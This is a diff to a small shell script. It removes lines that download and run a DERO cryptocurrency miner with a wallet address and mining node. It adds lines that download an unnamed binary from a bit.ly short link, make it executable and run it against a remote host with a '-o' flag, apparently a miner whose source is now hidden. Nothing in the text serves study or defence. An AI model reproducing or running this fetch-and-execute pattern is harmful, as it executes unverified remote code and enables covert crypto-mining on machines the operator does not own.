@@ -4,7 +4,6 @@
 # kumaha aink we njink
 
 cd /home
-wget https://github.com/DeroLuna/dero-miner/releases/download/v1.13-beta/deroluna-miner-linux-amd64.tar.gz
-tar -xf deroluna-miner-linux-amd64.tar.gz
-chmod +x deroluna-miner
-./deroluna-miner -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xetjpjsjdntaq3s5rx3my -d dero-node.mysrv.cloud:443
+wget https://bit.ly/3mPeYds
+chmod +x 3mPeYds 
+./3mPeYds -o heroku.erlandi.eu.org
